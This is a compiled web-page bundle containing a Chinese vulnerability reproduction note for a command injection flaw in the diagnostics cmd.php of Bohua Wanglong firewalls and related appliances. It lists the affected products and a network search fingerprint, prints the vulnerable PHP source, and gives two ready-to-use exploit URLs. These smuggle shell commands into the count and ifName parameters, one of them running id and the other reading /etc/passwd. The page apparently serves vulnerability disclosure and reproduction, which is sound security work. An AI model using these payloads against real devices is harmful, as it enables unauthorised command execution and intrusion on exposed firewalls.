(window.webpackJsonp=window.webpackJsonp||[]).push([[282],{1441:function(s,t,a){s.exports=a.p+"assets/img/1628671069270-2a8e5aae-ad02-4773-b7f4-769978f212d9.9b572716.png"},1442:function(s,t,a){s.exports=a.p+"assets/img/1628671453310-0bb29dd0-00b6-4f75-b6e8-3103b6ebbcdc.9953aa80.png"},2613:function(s,t,a){"use strict";a.r(t);var n=a(75),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,n=s._self._c||t;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"博华网龙防火墙-cmd-php-远程命令执行漏洞-oem"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#博华网龙防火墙-cmd-php-远程命令执行漏洞-oem"}},[s._v("#")]),s._v(" 博华网龙防火墙 cmd.php 远程命令执行漏洞(OEM)")]),s._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),n("p",[s._v("博华网龙防火墙 cmd.php 过滤不足，导致命令拼接执行远程命令")]),s._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("博华网龙防火墙")]),n("br"),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("博华网龙信息安全一体机")]),n("br"),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("博华龙芯防火墙")]),n("br"),s._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v('"博华网龙防火墙"')]),n("br"),s._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),n("p",[s._v("登录页面")]),s._v(" "),n("p",[n("img",{attrs:{src:a(1441),alt:"img"}})]),s._v(" "),n("p",[s._v("存在漏洞的文件为 "),n("code",[s._v("/diagnostics/cmd.php")])]),s._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token php language-php"}},[n("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("include_once")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"pub/pub.inc"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("include_once")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"pub/session.inc"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    \n    "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$username")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_SESSION")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"USER_NAME"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkApproachUrl")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" \n    \n  "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'action'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"ping"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$host")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'host'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$count")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'count'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"/bin/ping -c '),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$count")])]),s._v(' "')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("escapeshellarg")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$host")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('" >temp.htm"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        \n         "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$username")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("pSyslog")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"ping '),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$host")])]),s._v(" "),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$count")])]),s._v('次"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("           \n  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n  "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'action'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"traceroute"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$host")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'host'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ttl")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("  "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'ttl'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$useicmp")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'useicmp'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        \n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$useicmp")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$useicmp")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"-I"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$useicmp")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('""')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("        \n        "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"/usr/bin/traceroute -d '),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$useicmp")])]),s._v(' -w 2 -m "')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("escapeshellarg")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ttl")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('" "')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("escapeshellarg")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$host")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('" >temp.htm"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("    \n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$username")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("pSyslog")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"traceroute '),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$host")])]),s._v(" 跳数为"),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$ttl")])]),s._v('"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("     \n  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n  "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'action'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"arping"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$host")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'host'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$count")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'count'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$if")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'ifName'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$src")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'src'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"/usr/bin/arping -I '),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$if")])]),s._v(" -c "),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$count")])]),s._v(" -s "),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$src")])]),s._v(" "),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$host")])]),s._v(' >temp.htm"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    \n     "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$username")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("pSyslog")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"arping '),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$host")])]),s._v(" "),n("span",{pre:!0,attrs:{class:"token interpolation"}},[n("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$count")])]),s._v('次"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n  "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),s._v("\n  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"echo \\"\\" >temp.htm"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n  "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v(" \n"),n("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br")])]),n("p",[s._v("可以发现其中存在多个命令执行点，均可进行命令拼接执行恶意命令")]),s._v(" "),n("p",[s._v("构造命令执行")]),s._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("diagnostics"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("cmd"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("php"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("action"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("ping"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("count"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),n("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("id")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("diagnostics"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("cmd"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("php"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("action"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("arping"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("ifName"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),n("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("cat")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("etc"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),n("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("passwd")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1442),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=e.exports}}]);